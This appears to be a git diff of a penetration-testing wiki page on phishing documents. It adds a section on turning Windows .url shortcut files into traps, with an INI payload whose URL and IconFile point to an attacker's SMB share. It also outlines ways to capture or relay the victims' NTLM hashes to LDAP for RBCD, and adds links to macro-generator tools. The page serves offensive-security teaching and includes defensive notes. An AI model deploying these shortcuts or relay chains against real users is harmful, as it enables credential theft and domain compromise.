@@ -21,7 +21,7 @@ DOCX files referencing a remote template (File –Options –Add-ins –Manage: 
 ### External Image Load
 
 Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
@@ -80,8 +80,8 @@ Do this because you **can't save macro's inside a `.docx`** and there's a **stig
 #### Malicious Macros Generators
 
 - MacOS
-  - [**macphish**](https://github.com/cldrn/macphish)
-  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
+  - [https://github.com/cldrn/macphish](https://github.com/cldrn/macphish)
+  - [https://github.com/cedowens/Mythic-Macro-Generator](https://github.com/cedowens/Mythic-Macro-Generator)
 
 ## HTA Files
 
@@ -144,6 +144,30 @@ An HTA is executed using **`mshta.exe`**, which is typically **installed** along
 </script>
 ```
 
+## Internet Shortcut (.url) abuse
+
+Windows Internet Shortcut files (.url) can be weaponized to coerce authentication or reach arbitrary resources when a user double-clicks them. They are simple INI-like text files parsed by ShellExecute.
+
+Common fields and behaviours:
+
+```ini
+[InternetShortcut]
+URL=file:////10.10.14.6/share         ; UNC/file URL triggers SMB access
+IconFile=\\10.10.14.6\share\ico.ico    ; UNC icon fetch triggers SMB auth
+IconIndex=0
+```
+
+Abuse patterns:
+- Credential capture/relay: pointing either URL or IconFile to a UNC path will make Windows try to access it over SMB, yielding NTLM authentication that can be captured or relayed.
+- WPAD/relay chains: drop a .url inside a ZIP or review package so that a reviewer opens it, generating HTTP/SMB auth you can relay to LDAP using ntlmrelayx to perform RBCD.
+- Lateral execution helpers: after obtaining usable tickets via RBCD, .url can also point to authenticated intra-net resources to facilitate user interaction.
+
+Defensive notes:
+- Treat .url files as untrusted executables in email/web gateways; block or strip UNC-based IconFile/URL.
+- Disable “Automatically detect settings” or enforce authenticated WPAD only; prefer PAC via GPO and protect name resolution.
+
+See also: the NTLM relay section below for chaining with LDAP/RBCD.
+
 ## Forcing NTLM Authentication
 
 There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
@@ -164,9 +188,11 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 
 Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntlm-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
+## References
+
+- [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
